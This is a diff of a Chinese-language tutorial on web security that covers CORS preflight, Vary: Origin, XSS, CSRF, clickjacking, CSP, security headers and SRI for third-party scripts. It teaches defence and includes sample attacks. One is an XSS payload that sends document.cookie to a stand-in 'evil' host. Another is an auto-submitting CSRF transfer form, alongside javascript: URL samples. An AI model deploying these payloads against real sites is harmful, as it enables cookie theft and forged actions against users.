@@ -1,100 +1,207 @@
 ---
 title: '06 · 跨域与安全'
 published: 2026-10-26T10:30:00+08:00
-description: 'CORS 预检什么时候发、带 cookie 时为什么不能用 *、XSS/CSRF/点击劫持的真实攻击面，以及一份能直接抄的 CSP 配置。这一篇决定你能不能用 CDN 与第三方脚本。'
+description: 'CORS 预检什么时候发、带 cookie 时为什么不能用 *、Vary: Origin 怎么导致缓存串号，XSS/CSRF/点击劫持的完整攻击链与防御代码，以及一份能直接落地的 CSP + 安全响应头清单。'
 tags: [浏览器, 跨域, CORS, XSS, CSRF, CSP]
 category: 浏览器与性能学习路线
 draft: false
 ---
 
-## 同源策略：限制的是"读"，不是"发"
-
-同源 = 协议 + 域名 + 端口 三者完全一致。
-
-关键认知：**跨域请求能发出去，只是响应不能被 JS 读取**。所谓的"跨域报错"发生在**读响应**这一步。
-
-例外：`<img>`、`<script>`、`<link>`、`<form>` 这些"天然跨域"的标签不受限制——这也正是 JSONP 与 CSRF 存在的土壤。
+> [!NOTE]
+> 这一篇的每个结论都能用"发一个请求、看一个头"验证。建议边读边开 DevTools，把预检请求和响应头对着看一遍——比背十条规则有用。
 
 ---
 
-## CORS：什么时候会有两次请求
+## 1. 同源策略：限制的是"读"，不是"发"
+
+同源 = **协议 + 域名 + 端口**三者完全一致。`https://a.com` 与 `http://a.com` 不同源，`https://a.com:8443` 也不同源。
+
+关键认知：**跨域请求能发出去，只是响应不能被 JS 读取**。所谓"跨域报错"，发生在**读响应**这一步：
+
+```js
+// 请求真的发出去了，服务端也真的处理了（可能已经改了数据）
+// 但浏览器发现响应没有允许的 CORS 头，于是不把响应交给 JS
+fetch('https://api.other.com/delete', { method: 'POST' }).catch((e) => {
+  console.log(e); // TypeError: Failed to fetch —— 你拿不到状态码，也拿不到 body
+});
+```
+
+这解释了两件常被误解的事：
+
+- **"Postman 能通、浏览器不行"是正常的**：CORS 是浏览器的规则，Postman 不执行；
+- **CORS 不是服务端的安全防线**：真正的攻击者用 curl 直接打你的接口，根本不走浏览器。接口鉴权必须自己做（06 篇的安全部分与 12 篇的密钥管理）。
+
+三个"天然跨域"的例外：`<img>`、`<script>`、`<link>`、`<form>` 可以加载/提交跨域资源，不受同源策略限制（但读取响应内容仍受限）。JSONP 与 CSRF 都长在这块土壤上。
+
+---
+
+## 2. CORS：什么时候会有两次请求
 
 ```text
-简单请求（GET/POST + 仅安全头 + 特定 Content-Type）
+简单请求（GET/HEAD/POST + 仅安全头 + 三种 Content-Type）
   └── 直接发，带 Origin，看响应头的 Allow-Origin
 
-非简单请求（PUT/DELETE、application/json、自定义头）
+非简单请求（PUT/DELETE/PATCH、application/json、自定义头）
   └── 先发 OPTIONS 预检 → 服务端允许 → 再发真实请求
 ```
 
-简单请求的三个条件（必须**同时**满足）：方法属于 `GET/HEAD/POST`；只带安全头（`Accept`、`Accept-Language`、`Content-Language`、`Content-Type` 等）；`Content-Type` 只能是 `text/plain`、`multipart/form-data`、`application/x-www-form-urlencoded`。
+简单请求的三个条件必须**同时**满足：
 
-> 所以 `fetch(url, { method:'POST', headers:{'Content-Type':'application/json'} })` **一定会预检**——这是最常见的"多一次 OPTIONS"来源。
+| 条件 | 允许的值 |
+| --- | --- |
+| 方法 | `GET` / `HEAD` / `POST` |
+| 请求头 | 仅 CORS 安全头（`Accept`、`Accept-Language`、`Content-Language`、`Content-Type`、`Range` 等） |
+| `Content-Type` | 只能是 `text/plain`、`multipart/form-data`、`application/x-www-form-urlencoded` |
 
-### 带 cookie 的三条硬规则
+> 所以 `fetch(url, { method:'POST', headers:{'Content-Type':'application/json'} })` **一定预检**——`application/json` 不在安全列表里。这是"多一次 OPTIONS"的第一大来源。
+
+一次完整的预检长这样：
+
+```http
+OPTIONS /api/tasks HTTP/1.1
+Origin: https://app.example.com
+Access-Control-Request-Method: POST
+Access-Control-Request-Headers: content-type, authorization
+
+HTTP/1.1 204 No Content
+Access-Control-Allow-Origin: https://app.example.com
+Access-Control-Allow-Methods: GET, POST, PATCH, DELETE
+Access-Control-Allow-Headers: Content-Type, Authorization
+Access-Control-Allow-Credentials: true
+Access-Control-Max-Age: 600
+Vary: Origin
+```
+
+### 2.1 带 cookie 的三条硬规则
 
 ```js
 // 前端
 fetch('https://api.example.com/me', { credentials: 'include' });
+```
 
+```http
 // 服务端
 Access-Control-Allow-Origin: https://app.example.com   // ❌ 不能是 *
 Access-Control-Allow-Credentials: true
 Access-Control-Allow-Headers: Content-Type, Authorization
-Access-Control-Max-Age: 600                            // 预检结果缓存 10 分钟
 ```
 
-三条规则缺一不可：
+三条缺一不可：
 
-1. `Allow-Origin` 必须是**具体来源**，不能 `*`（浏览器直接拒绝）；
+1. `Allow-Origin` 必须是**具体来源**，不能 `*`（带凭据时浏览器直接拒绝）；
 2. 必须有 `Allow-Credentials: true`；
-3. 预检响应里不能用 `*` 通配头（`Allow-Headers/Methods` 要列具体值）。
+3. 预检响应里不能用 `*` 通配头，`Allow-Headers` / `Allow-Methods` 要列具体值。
 
-`Max-Age` 值得配：不配的话每个非简单请求都要多一次 OPTIONS（移动网络下等于多 200–400ms）。
+`Max-Age` 值得配：不配的话每个非简单请求都要多一次 OPTIONS。注意浏览器有上限（Chrome 约 2 小时、Firefox 24 小时），写 `86400` 也只会生效到上限。
 
-**常见误解**：CORS 是**浏览器**的规则，服务端日志里能看到请求成功，但前端读不到——所以"Postman 能通、浏览器不行"是正常的。
+### 2.2 一次能直接用的服务端实现
+
+```js
+const ALLOWED = new Set([
+  'https://app.example.com',
+  'https://admin.example.com',
+]);
+
+app.use((req, res, next) => {
+  const origin = req.headers.origin;
+  if (ALLOWED.has(origin)) {
+    res.setHeader('Access-Control-Allow-Origin', origin); // 回显白名单内的来源
+    res.setHeader('Vary', 'Origin');                      // 必须！否则 CDN 会串号
+    res.setHeader('Access-Control-Allow-Credentials', 'true');
+  }
+  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PATCH, DELETE, OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
+  res.setHeader('Access-Control-Max-Age', '600');
+  if (req.method === 'OPTIONS') return res.sendStatus(204);
+  next();
+});
+```
+
+`Vary: Origin` 是最容易漏的一行：`Allow-Origin` 是动态回显的，如果前面有 CDN 且缓存键不含 `Origin`，A 站的响应会被复用给 B 站，表现就是"偶尔跨域失败、刷新几次又好了"。
 
 ---
 
-## XSS：三种注入路径
+## 3. XSS：三种注入路径
 
 | 类型 | 注入点 | 例子 |
 | --- | --- | --- |
-| **存储型** | 数据入库后渲染 | 评论里写 `<img src=x onerror=steal()>` |
-| **反射型** | URL 参数直接回显 | 搜索页把 `q` 原样输出 |
-| **DOM 型** | 前端自己把不可信数据塞进 DOM | `el.innerHTML = location.hash` |
+| **存储型** | 数据入库后渲染给所有人 | 评论里写 `<img src=x onerror=fetch('//evil?'+document.cookie)>` |
+| **反射型** | URL 参数被服务端原样回显 | 搜索页把 `q` 直接拼进 HTML |
+| **DOM 型** | 前端自己把不可信数据塞进 DOM | `el.innerHTML = location.hash.slice(1)` |
 
-前端能做的四件事：
+三种典型的注入点，按"前端能管"排序：
 
 ```js
-// 1) 默认用 textContent / 框架的插值（React/Vue 默认转义）
-el.textContent = userInput;                       // ✅
+// ① 最危险：innerHTML 拼用户数据
+el.innerHTML = `<p>${user.bio}</p>`;   // bio 里可以是 <img onerror=...>
 
-// 2) 必须插 HTML 时，先净化
-import DOMPurify from 'dompurify';
-el.innerHTML = DOMPurify.sanitize(userInput);     // ✅
+// ② 属性注入：把用户数据拼进 href / src / style
+el.innerHTML = `<a href="${url}">链接</a>`; // url 可以是 javascript:alert(1)
 
-// 3) 别把用户数据拼进 URL 协议位
-location.href = userInput;                        // ❌ javascript:alert(1)
-// ✅ 白名单协议
-const u = new URL(userInput, location.origin);
-if (!['http:', 'https:'].includes(u.protocol)) throw new Error('非法协议');
-
-// 4) 富文本只允许白名单标签
+// ③ 模板引擎的"不转义"开关（不同库叫法不同）
+element.innerHTML = template({ raw: userInput }); // 关掉转义等于 ①
 ```
 
-`innerHTML` 是最常见的入口。**只有在内容可控（自己写的模板）时才能用**，任何来自用户/接口的字符串都要净化。
+### 3.1 前端能做的四件事
+
+```js
+// 1) 默认用 textContent / 框架插值（React/Vue 默认转义）
+el.textContent = userInput;                              // ✅ 结构上安全
+
+// 2) 必须插 HTML 时，先净化（配置要收紧，别用默认全开）
+import DOMPurify from 'dompurify';
+const clean = DOMPurify.sanitize(userHtml, {
+  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a', 'ul', 'ol', 'li', 'code', 'pre'],
+  ALLOWED_ATTR: ['href', 'title'],
+  ALLOW_DATA_ATTR: false,
+});
+el.innerHTML = clean;
+
+// 3) 校验协议位：不要直接把用户输入塞进 href / src
+function safeUrl(input) {
+  const u = new URL(input, location.origin);
+  if (!['http:', 'https:', 'mailto:'].includes(u.protocol)) throw new Error('非法协议');
+  return u.href;
+}
+
+// 4) 富文本只允许白名单标签，并在服务端二次净化（前端净化可被绕过）
+```
+
+React 里有一个等价陷阱：
+
+```jsx
+// ❌ 名字叫 dangerously，就真的危险
+<div dangerouslySetInnerHTML={{ __html: userHtml }} />
+
+// ✅ 先净化
+<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userHtml) }} />
+```
+
+### 3.2 更硬的防线：Trusted Types
+
+现代浏览器支持把"字符串赋值给 innerHTML"这件事本身禁掉，只允许经过策略处理的对象：
+
+```js
+// 需要 CSP 里配合：require-trusted-types-for 'script'
+const policy = trustedTypes.createPolicy('default', {
+  createHTML: (s) => DOMPurify.sanitize(s),
+});
+el.innerHTML = policy.createHTML(userHtml); // 传普通字符串会被拒绝
+```
+
+它的价值在**存量代码审计**：开了之后，所有未净化的 `innerHTML =` 都会在控制台报错，能把隐藏的注入点一次性炸出来。
 
 ---
 
-## CSRF：为什么 SameSite 救了一半
+## 4. CSRF：为什么 SameSite 救了一半
 
-CSRF 的本质：**别的站点诱导用户浏览器带着 cookie 发请求**。
+CSRF 的本质：**别的站点诱导用户浏览器，带着用户的 cookie 发请求**。攻击者不需要读到响应，只要请求生效就赢了。
 
 ```html
-<!-- attacker.com 上的图片，用户一访问就发出 POST -->
+<!-- attacker.com 上，用户一访问就自动提交 -->
 <form action="https://bank.com/transfer" method="POST" id="f">
-  <input name="to" value="attacker"><input name="amount" value="10000">
+  <input name="to" value="attacker">
+  <input name="amount" value="10000">
 </form>
 <script>document.getElementById('f').submit()</script>
 ```
@@ -103,20 +210,53 @@ CSRF 的本质：**别的站点诱导用户浏览器带着 cookie 发请求**。
 
 | 手段 | 说明 | 现状 |
 | --- | --- | --- |
-| `SameSite=Lax`（默认） | 跨站 POST 不带 cookie | 挡住大部分场景，**现代浏览器默认值** |
-| CSRF Token | 服务端下发，提交时必须带上 | 老系统的标准做法 |
+| `SameSite=Lax`（默认） | 跨站 POST 不带 cookie | 挡住大部分场景，现代浏览器默认 |
+| CSRF Token | 服务端下发，提交时必须带上 | 老系统标准做法；`SameSite=None` 场景仍必需 |
 | 校验 `Origin` / `Referer` | 服务端拒绝异常来源 | 简单有效，建议都做 |
 
-因为 `SameSite=Lax` 已成默认，纯跨站表单攻击基本失效；但 **`SameSite=None` 的场景（第三方嵌入）仍然需要 Token**。
+Token 的两种常见实现：
+
+```js
+// A. 同步令牌：会话里存一份，表单/请求头带一份，服务端比对
+app.post('/transfer', (req, res) => {
+  if (req.body.csrf !== req.session.csrf) return res.status(403).end();
+  // ...
+});
+
+// B. 双提交 cookie：随机值同时写 cookie 与请求头，服务端只比对两者是否相等
+//（不依赖会话存储，适合前后端分离；必须配 SameSite=Lax/Strict 或 Origin 校验）
+```
+
+Origin 校验是最省事的一道闸：
+
+```js
+const TRUSTED = new Set(['https://app.example.com']);
+app.use((req, res, next) => {
+  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();
+  const origin = req.headers.origin;
+  if (origin && !TRUSTED.has(origin)) return res.status(403).end();
+  next();
+});
+```
+
+因为 `SameSite=Lax` 已成默认，纯跨站表单攻击基本失效；但 **`SameSite=None` 的场景（第三方嵌入、跨站 API）仍然需要 Token**，别以为有了 SameSite 就万事大吉。
 
 ---
 
-## 点击劫持与 CSP
+## 5. 点击劫持与 CSP
 
-```html
-<!-- 禁止被 iframe 嵌入 -->
+点击劫持：把目标站放进透明 iframe，诱导用户在"看起来是别的按钮"上点击。
+
+```http
+# 禁止被 iframe 嵌入（二选一或都写）
 X-Frame-Options: DENY
 Content-Security-Policy: frame-ancestors 'none'
+```
+
+`frame-ancestors` 更灵活，可以指定允许的父级：
+
+```http
+Content-Security-Policy: frame-ancestors 'self' https://partner.example.com
 ```
 
 一份"能落地"的 CSP（先报告，再收紧）：
@@ -124,12 +264,27 @@ Content-Security-Policy: frame-ancestors 'none'
 ```http
 Content-Security-Policy:
   default-src 'self';
-  script-src 'self' 'nonce-<随机>' https://cdn.example.com;
+  script-src 'self' 'nonce-RANDOM' 'strict-dynamic' https://cdn.example.com;
   style-src 'self' 'unsafe-inline';
   img-src 'self' data: https://cdn.example.com;
   connect-src 'self' https://api.example.com;
   font-src 'self' https://cdn.example.com;
+  frame-ancestors 'none';
+  base-uri 'self';
+  object-src 'none';
   report-uri /csp-report
+```
+
+`nonce` 的生成必须**每次请求不同**（服务端渲染时注入），否则等于没写：
+
+```js
+// 服务端渲染 HTML 时
+const nonce = crypto.randomBytes(16).toString('base64');
+res.setHeader(
+  'Content-Security-Policy',
+  `default-src 'self'; script-src 'nonce-${nonce}' 'strict-dynamic'; object-src 'none'; base-uri 'self'`,
+);
+// 模板里：<script nonce="${nonce}" src="/app.js"></script>
 ```
 
 落地顺序（一口吃不下）：
@@ -143,48 +298,97 @@ Content-Security-Policy:
 
 ---
 
-## 第三方脚本：供应链风险
+## 6. 一份安全响应头清单
 
-埋点、客服、AB 测试的脚本都在你的**主域**下执行，能读你的 DOM、cookie、localStorage。
+| 头 | 推荐值 | 防什么 |
+| --- | --- | --- |
+| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | 降级到 HTTP、cookie 被明文截获 |
+| `X-Content-Type-Options` | `nosniff` | 浏览器把 JSON 当脚本执行 |
+| `Referrer-Policy` | `strict-origin-when-cross-origin` | 把完整 URL（含 token）泄漏给第三方 |
+| `Permissions-Policy` | `camera=(), microphone=(), geolocation=()` | 第三方 iframe 偷偷调用设备能力 |
+| `Cross-Origin-Opener-Policy` | `same-origin` | 跨窗口引用、Spectre 类侧信道 |
+| `Cross-Origin-Resource-Policy` | `same-origin`（按需） | 资源被其它站盗链/嵌入 |
 
-- 用 `SRI` 校验固定版本：`<script src="..." integrity="sha384-..." crossorigin>`;
-- 给 iframe 沙箱：`sandbox="allow-scripts"`（别加 `allow-same-origin`，两者同时存在等于没沙箱）；
-- 用 CSP 的 `script-src` 限定来源；
+注意 HSTS 的不可逆性：一旦设了长 `max-age`，回退到 HTTP 会在用户端持续失败。先小 `max-age` 试，再逐步加长。
+
+---
+
+## 7. 第三方脚本：供应链风险
+
+埋点、客服、AB 测试脚本都在你的**主域**下执行，能读你的 DOM、cookie、localStorage。一旦对方被入侵，等于你自己的站被入侵。
+
+```html
+<!-- 固定版本 + 完整性校验（版本变了 integrity 会失败，必须显式升级） -->
+<script
+  src="https://cdn.vendor.com/sdk@1.2.3.min.js"
+  integrity="sha384-BASE64_HASH"
+  crossorigin="anonymous"
+  defer
+></script>
+```
+
+`integrity` 的哈希怎么来：
+
+```bash
+curl -s https://cdn.vendor.com/sdk@1.2.3.min.js | openssl dgst -sha384 -binary | openssl base64 -A
+```
+
+iframe 沙箱的正确姿势：
+
+```html
+<!-- ✅ 只给脚本能力 -->
+<iframe src="https://vendor.com/widget" sandbox="allow-scripts"></iframe>
+
+<!-- ❌ allow-scripts + allow-same-origin 等于没有沙箱（脚本可以自己摘掉沙箱） -->
+<iframe src="https://vendor.com/widget" sandbox="allow-scripts allow-same-origin"></iframe>
+```
+
+另外两条纪律：
+
+- CSP 的 `script-src` 限定来源，别用 `*`；
 - 第三方必须能"随时撤掉"——不要让它成为首屏阻塞资源（见 01 篇 `async` 的坑）。
 
 ---
 
-## 常见坑
+## 8. 常见坑
 
 | 现象 | 根因 | 解法 |
 | --- | --- | --- |
 | 带 cookie 报 CORS | `Allow-Origin: *` | 改成具体来源 + `Allow-Credentials` |
-| 每个请求都多一次 OPTIONS | `Max-Age` 没配 / 用了自定义头 | 配 `Max-Age: 600`，减少自定义头 |
-| Postman 通、浏览器不通 | CORS 是浏览器策略 | 检查响应头，不是请求 |
+| 每个请求都多一次 OPTIONS | `Max-Age` 没配 / 用了自定义头 | 配 `Max-Age`，减少自定义头 |
+| 偶尔跨域失败、刷新又好 | 漏 `Vary: Origin`，缓存串号 | 加 `Vary: Origin` |
+| Postman 通、浏览器不通 | CORS 是浏览器策略 | 检查**响应**头，不是请求 |
 | 用户输入含 `<` 显示成标签 | 用了 `innerHTML` | `textContent` 或 DOMPurify |
-| CSP 上线后页面白屏 | 内联脚本被拦 | 用 nonce；或先 Report-Only |
-| iframe 嵌入后 cookie 丢失 | `SameSite=Lax` 不发送 | 第三方场景用 `None; Secure` + Token 防 CSRF |
-| 图片 src 被设置成 `javascript:` | 未校验协议 | 白名单 `http/https` |
+| 富文本净化后仍有弹窗 | 净化配置过宽 / 只在客户端净化 | 收紧白名单 + 服务端二次净化 |
+| CSP 上线后页面白屏 | 内联脚本被拦 | `nonce`；或先 `Report-Only` |
+| iframe 嵌入后 cookie 丢失 | `SameSite=Lax` 不发送 | 第三方场景 `None; Secure` + Token |
+| `src` 被设成 `javascript:` | 未校验协议 | 白名单 `http/https` |
+| 第三方脚本被投毒 | 没有完整性校验 | SRI + CSP 限定来源 |
 
 ---
 
-## 验收清单
+## 9. 验收清单
 
 - [ ] 能判断一个请求会不会触发预检，并说出原因
-- [ ] 带 cookie 的跨域：`Allow-Origin` 是具体值 + `Allow-Credentials: true` + 列具体头
-- [ ] 项目里 `innerHTML` 都有净化（或内容完全可控）
+- [ ] 带 cookie 的跨域：`Allow-Origin` 是具体值 + `Allow-Credentials: true` + 列具体头 + `Vary: Origin`
+- [ ] 项目里 `innerHTML` / `dangerouslySetInnerHTML` 都有净化（或内容完全可控）
 - [ ] 会话 cookie 是 `HttpOnly` + `Secure` + 明确 `SameSite`
-- [ ] 有 `X-Frame-Options` 或 `frame-ancestors`
+- [ ] 有 `frame-ancestors` 或 `X-Frame-Options`
 - [ ] 有 CSP（哪怕是 Report-Only），且知道下一步怎么收紧
-- [ ] 第三方脚本有来源限制，且不阻塞首屏
+- [ ] 安全响应头（HSTS / nosniff / Referrer-Policy）已配置
+- [ ] 第三方脚本有 SRI 与来源限制，且不阻塞首屏
 
 ---
 
-## 练习
+## 10. 练习
 
-1. **数一次预检**：用 `Content-Type: application/json` 发一个 POST，在 Network 里找到 OPTIONS，加上 `Max-Age` 后再发，确认预检被缓存。  
-   *自检*：能解释"为什么简单请求不预检"。
+1. **数一次预检**：用 `Content-Type: application/json` 发一个 POST，在 Network 里找到 OPTIONS；加上 `Max-Age` 后再发，确认预检被缓存。  
+   *自检*：能解释"为什么简单请求不预检"，并说出 `application/json` 为什么不在安全列表里。
 2. **复现一次 XSS**：在本地页面用 `innerHTML` 渲染 `<img src=x onerror="alert(1)">`，再换 `textContent` 与 DOMPurify 对比。  
-   *自检*：三种写法的表现差异能说清。
-3. **写一份 CSP Report-Only**：只收集不拦截，跑一天看 violations，列出你项目实际需要放行的域。  
-   *自检*：能说出"为什么不能一上来就强制"。
+   *自检*：三种写法的表现差异能说清，且知道 DOMPurify 的白名单为什么要收紧。
+3. **写一份 CSP Report-Only**：只收集不拦截，跑一天看 violations，列出项目实际需要放行的域。  
+   *自检*：能说出"为什么不能一上来就强制"，以及 nonce 为什么必须每次不同。
+4. **复现 `Vary` 串号**：两个 Origin 请求同一接口，服务端动态回 `Allow-Origin` 但不加 `Vary`，前面放一层缓存。  
+   *自检*：能观察到第二个 Origin 拿到第一个 Origin 的头，并说出修法。
+5. **给第三方脚本加 SRI**：选一个 CDN 脚本，算哈希、加 `integrity`，再故意改一个字符看是否被拦。  
+   *自检*：能解释 `crossorigin` 为什么必须一起加。
